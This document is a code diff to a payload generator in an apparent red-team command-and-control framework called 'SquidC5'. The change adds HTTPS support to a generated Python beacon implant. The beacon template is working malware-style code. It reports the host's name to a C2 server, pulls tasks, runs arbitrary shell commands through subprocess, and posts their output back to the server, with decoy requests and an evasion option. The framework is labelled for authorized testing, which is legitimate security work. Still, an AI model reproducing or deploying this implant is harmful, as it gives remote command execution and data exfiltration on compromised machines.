@@ -75,6 +75,7 @@ class PayloadGenerator:
                 evasion=bool(extra.get("evasion", True)),
                 zone=extra.get("zone") or "c2.lab.invalid",
                 ws_path=(extra.get("ws_path") or session_path) if "ws" in template else None,
+                scheme=extra.get("scheme"),
             )
             body = out["content"]
         else:
@@ -114,12 +115,16 @@ class PayloadGenerator:
         decoys_json = json.dumps(decoys)
         resp_pref = json.dumps(extra.get("response_prefix") or "")
         resp_suf = json.dumps(extra.get("response_suffix") or "")
+        scheme = (extra.get("scheme") or "http").lower()
+        if scheme not in ("http", "https"):
+            scheme = "http"
         return f'''#!/usr/bin/env python3
 # SquidC5 HTTP beacon — authorized testing only (profile-aware)
-import json, random, time, urllib.request
-BASE = "http://{host}:{port}"
+import json, random, time, urllib.request, ssl
+BASE = "{scheme}://{host}:{port}"
 PATH = {json.dumps(path)}
 C2 = BASE + PATH
+SSL_CTX = ssl.create_default_context() if BASE.startswith("https") else None
 UA = {ua}
 EXTRA_HEADERS = {hdrs_json}
 BODY_TPL = {body_tpl_json}
@@ -155,12 +160,17 @@ def _headers():
     h.update(EXTRA_HEADERS or {{}})
     return h
 
+def _open(req):
+    if SSL_CTX is not None:
+        return urllib.request.urlopen(req, timeout=30, context=SSL_CTX)
+    return urllib.request.urlopen(req, timeout=30)
+
 def _decoy():
     if not DECOY_ENABLED or not DECOYS:
         return
     try:
         p = random.choice(DECOYS)
-        urllib.request.urlopen(urllib.request.Request(BASE + p, headers={{"User-Agent": UA}}), timeout=5).read()
+        _open(urllib.request.Request(BASE + p, headers={{"User-Agent": UA}})).read()
     except Exception:
         pass
 
@@ -170,7 +180,7 @@ while True:
         payload = {{"session_id": SID, "hostname": __import__("socket").gethostname()}}
         body = _wrap(payload).encode()
         req = urllib.request.Request(C2, data=body, headers=_headers(), method="POST")
-        with urllib.request.urlopen(req, timeout=30) as r:
+        with _open(req) as r:
             data = _unwrap(r.read().decode())
             SID = data.get("session_id", SID)
             task = data.get("task")
@@ -179,7 +189,7 @@ while True:
                 out = subprocess.getoutput(task.get("command", "echo ok"))
                 done_body = _wrap({{"task_id": task["id"], "result": out}}).encode()
                 done = urllib.request.Request(C2 + "/result", data=done_body, headers=_headers(), method="POST")
-                urllib.request.urlopen(done, timeout=30).read()
+                _open(done).read()
     except Exception:
         pass
     _sleep()
